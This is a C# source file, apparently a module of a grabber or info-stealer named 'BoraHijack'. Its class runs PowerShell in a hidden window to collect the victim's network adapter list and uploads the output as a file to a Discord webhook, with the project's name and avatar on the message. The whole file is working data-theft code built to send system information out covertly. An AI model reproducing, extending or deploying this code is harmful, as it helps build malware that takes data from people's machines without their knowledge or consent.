using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Discord;
using Discord.Webhook;
using System.Diagnostics;
#pragma warning disable CS0028

namespace BoraHijack.Grabbers
{
    class NetworkAdapters
    {
        public static async Task MainADAPT(string webhookUrl)
        {
            string Output = GetAdapters();

            // Convert to memory stream
            var ms = new MemoryStream();
            var writer = new StreamWriter(ms);
            writer.Write(Output);
            writer.Flush();
            ms.Position = 0;

            var client = new DiscordWebhookClient(webhookUrl);
            await client.SendFileAsync(
                ms,
                filename: "Adapters.txt",
                text: "Network adapters",
                isTTS: false,
                embeds: null,
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png"
            );
        }

        static string GetAdapters()
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "Get-NetAdapter| Format-Table -AutoSize | Out-String",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            // prevents resource leaks
            using (var process = Process.Start(psi))
            {
                if (process == null)
                    return "❌ Failed to start PowerShell";

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }
    }
}
